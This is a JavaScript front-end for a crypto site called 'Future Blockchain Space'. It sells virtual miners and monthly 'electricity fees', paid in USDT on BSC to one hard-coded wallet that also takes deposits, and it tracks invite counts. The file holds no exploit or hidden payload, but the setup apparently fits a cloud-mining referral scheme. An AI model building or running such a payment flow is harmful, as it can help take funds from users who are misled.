/**
 * Future Blockchain Space - 逻辑控制中心 (Debug 增强版)
 */

const API_BASE = "https://api.fbsfbs.fit"; 
const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955"; 
const BSC_CHAIN_ID = '0x38'; 

const RECEIVE_ADDRESSES = {
    MINER: "0x8922A66C6898d9e26D9747206466795880482937",
    ELECTRIC: "0x8922A66C6898d9e26D9747206466795880482937",
    DEPOSIT: "0x8922A66C6898d9e26D9747206466795880482937"
};

const tokenData = {
    'FBS': { price: 0.1, logo: 'assets/fbs_logo.png' },
    'FBST': { price: 0.05, logo: 'assets/fbst_logo.png' },
    'FBSP': { price: 1.2, logo: 'assets/fbsp_logo.png' },
    'PBSU': { price: 1.0, logo: 'assets/fbsu_logo.png' }, 
    'USDT': { price: 1.0, logo: 'assets/USDT.png' },
    'BNB': { price: 600, logo: 'assets/BNB.png' },
    'BTC': { price: 65000, logo: 'assets/BTC.png' },
    'ETH': { price: 3500, logo: 'assets/ETH.png' }
};

let currentAddress = null;

// --- 修正后的地址格式化函数 ---
function getSafeAddr(addr) {
    if (!addr || typeof addr !== 'string') return "";
    const cleanAddr = addr.toLowerCase().trim();
    try {
        // 尝试转换为 EIP-55 标准地址
        return ethers.getAddress(cleanAddr);
    } catch (e) {
        console.warn("Checksum 转换失败，使用小写地址备选:", cleanAddr);
        return cleanAddr; // 返回清理过的小写地址，防止流程中断
    }
}

function getT(key) {
    const lang = localStorage.getItem('fbs_lang') || 'zh-CN';
    return (window.i18n && i18n[lang] && i18n[lang][key]) ? i18n[lang][key] : key;
}

// --- 转账核心逻辑 (增加详细报错提示) ---
async function handleContractPay(businessType) {
    console.log("触发支付:", businessType);
    if (!window.ethereum) return alert("未检测到钱包环境");

    try {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        
        const targetAddr = RECEIVE_ADDRESSES[businessType];
        
        let rawAmount = "0";
        if (businessType === 'MINER') {
            const el = document.getElementById('buyTotal');
            rawAmount = el ? el.innerText.replace('$ ', '') : "0";
        } else {
            const el = document.getElementById('feeDays');
            rawAmount = el ? (el.value / 30 * 60).toString() : "60";
        }

        console.log(`转账详情: 目标=${targetAddr}, 金额=${rawAmount}`);
        await executeTransfer(signer, targetAddr, rawAmount);
    } catch (err) {
        console.error("支付准备阶段出错:", err);
        alert("初始化支付失败: " + err.message);
    }
}

async function executeTransfer(signer, to, amountStr) {
    try {
        const safeTo = getSafeAddr(to);
        const safeContract = getSafeAddr(USDT_ADDR);
        
        console.log("执行转账 - 格式化地址:", { to: safeTo, contract: safeContract });

        const usdtAbi = ["function transfer(address to, uint256 amount) public returns (bool)"];
        const usdtContract = new ethers.Contract(safeContract, usdtAbi, signer);
        
        const amount = ethers.parseUnits(amountStr.toString(), 18);
        
        // 发起转账前检查
        console.log("正在唤起钱包确认...");
        const tx = await usdtContract.transfer(safeTo, amount);
        
        alert("交易已提交! Hash: " + tx.hash);
        closeModal();
    } catch (e) {
        console.error("转账执行失败:", e);
        // 如果是余额不足，e.message 通常会包含 "insufficient funds"
        if (e.message.includes("insufficient funds")) {
            alert("支付失败：钱包内 BNB 或 USDT 余额不足");
        } else {
            alert("交易取消或失败: " + (e.reason || e.message));
        }
    }
}

// --- 钱包链接与网络同步 ---
async function connectWallet() {
    if (!window.ethereum) return alert("请在钱包内打开");
    try {
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        if (chainId !== BSC_CHAIN_ID) {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: BSC_CHAIN_ID }],
            });
        }

        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        currentAddress = accounts[0];
        updateWalletUI(currentAddress);
        fetchUserData(currentAddress);
    } catch (error) {
        console.error("连接失败:", error);
    }
}

async function fetchUserData(address) {
    try {
        const res = await fetch(`${API_BASE}/api/user?address=${address.toLowerCase()}`);
        if (!res.ok) throw new Error("Server 500 Error");
        const data = await res.json();
        syncUIData(data);
    } catch (err) {
        console.warn("飞书同步失败:", err);
        renderTokens({}); // 渲染空列表避免空白
    }
}

function syncUIData(data) {
    if (data.balances) renderTokens(data.balances);
    const invEl = document.getElementById('inviteCount');
    if (invEl && data.inviteCount) invEl.innerText = data.inviteCount;
}

function renderTokens(userBalances = {}) {
    const container = document.getElementById('tokenRows');
    if (!container) return;
    let total = 0;
    const html = Object.keys(tokenData).map(symbol => {
        const bal = parseFloat(userBalances[symbol] || 0);
        const val = bal * tokenData[symbol].price;
        total += val;
        return `
            <div class="flex items-center justify-between p-4 border-b border-slate-50">
                <div class="flex items-center gap-3">
                    <img src="${tokenData[symbol].logo}" class="w-8 h-8 rounded-full" onerror="this.src='https://ui-avatars.com/api/?name=${symbol}'">
                    <span class="font-bold text-sm">${symbol}</span>
                </div>
                <div class="text-right">
                    <div class="font-bold">${bal.toFixed(4)}</div>
                    <div class="text-[10px] text-slate-400">$ ${val.toFixed(2)}</div>
                </div>
            </div>`;
    }).join('');
    container.innerHTML = html;
    if (document.getElementById('totalValue')) document.getElementById('totalValue').innerText = total.toFixed(2);
}

function updateWalletUI(addr) {
    const btn = document.getElementById('walletAddr');
    if (btn) btn.innerText = addr ? addr.slice(0,6)+'...'+addr.slice(-4) : "连接钱包";
}

function openMinerModal(type) {
    const content = document.getElementById('modalContent');
    const title = document.getElementById('modalTitle');
    if (type === 'buy') {
        title.innerText = "购买矿机";
        content.innerHTML = `
            <div class="space-y-4">
                <div class="grid grid-cols-3 gap-2">
                    ${[1, 5, 10].map(n => `<button onclick="setBuyNum(${n}, this)" class="buy-btn border p-2 rounded-xl text-xs font-bold">${n}</button>`).join('')}
                </div>
                <div class="p-4 bg-slate-50 rounded-2xl flex justify-between">
                    <span class="text-blue-600 font-bold" id="buyTotal">$ 0.00</span>
                </div>
                <button onclick="handleContractPay('MINER')" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-bold">确认支付</button>
            </div>`;
    } else {
        title.innerText = "缴纳电费";
        content.innerHTML = `
            <select id="feeDays" class="w-full p-4 bg-slate-50 rounded-2xl">
                <option value="30">30天 ($60)</option>
            </select>
            <button onclick="handleContractPay('ELECTRIC')" class="w-full bg-slate-900 text-white py-4 mt-4 rounded-2xl font-bold">确认缴纳</button>`;
    }
    document.getElementById('modalOverlay').classList.remove('hidden');
}

function closeModal() { document.getElementById('modalOverlay').classList.add('hidden'); }
function setBuyNum(n, btn) {
    document.querySelectorAll('.buy-btn').forEach(b => b.classList.remove('bg-blue-600', 'text-white'));
    btn.classList.add('bg-blue-600', 'text-white');
    document.getElementById('buyTotal').innerText = `$ ${(n * 150).toFixed(2)}`;
}

document.addEventListener('DOMContentLoaded', () => { renderTokens(); });
